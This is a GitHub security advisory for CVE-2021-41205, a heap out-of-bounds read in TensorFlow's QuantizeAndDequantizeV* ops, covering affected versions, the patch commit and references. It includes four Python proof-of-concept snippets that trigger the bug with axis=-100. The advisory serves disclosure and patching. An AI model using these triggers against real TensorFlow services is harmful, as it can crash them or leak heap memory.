# [M] Heap OOB read in all `tf.raw_ops.QuantizeAndDequantizeV*` ops

## Summary
Severity: Medium
Advisory: GHSA-49rx-x2rw-pc6f
CVE: CVE-2021-41205
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H (CVSS_V3)
Published: 2021-11-10
Source: https://github.com/advisories/GHSA-49rx-x2rw-pc6f
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow` — affected >=0 <2.4.4
- PyPI: `tensorflow-cpu` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow-cpu` — affected >=0 <2.4.4
- PyPI: `tensorflow-gpu` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow-gpu` — affected >=0 <2.4.4

## Details
### Impact
The [shape inference functions for the `QuantizeAndDequantizeV*` operations](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/array_ops.cc) can trigger a read outside of bounds of heap allocated array as illustrated in the following sets of PoCs:

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV4Grad(
    gradients=[1.0,1.0],
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    axis=-100)
  return data

test()
```

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV4(
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    signed_input=False,
    num_bits=10,
    range_given=False,
    round_mode='HALF_TO_EVEN',
    narrow_range=False,
    axis=-100)
  return data

test()
```

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV3(
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    signed_input=False,
    num_bits=10,
    range_given=False,
    narrow_range=False,
    axis=-100)
  return data

test()
```

```python
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV2(
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    signed_input=False,
    num_bits=10,
    range_given=False,
    round_mode='HALF_TO_EVEN',
    narrow_range=False,
    axis=-100)
  return data

test()
```

In all of these cases, `axis` is a negative value different than the special value used for optional/unknown dimensions (i.e., -1). However, the code ignores the occurences of these values:

```cc
...
if (axis != -1) {
  ...
  c->Dim(input, axis);
  ...
}
```

### Patches
We have patched the issue in GitHub commit [7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d](https://github.com/tensorflow/tensorflow/commit/7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-49rx-x2rw-pc6f
- https://nvd.nist.gov/vuln/detail/CVE-2021-41205
- https://github.com/tensorflow/tensorflow/commit/7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-615.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-813.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-398.yaml
- https://github.com/tensorflow/tensorflow
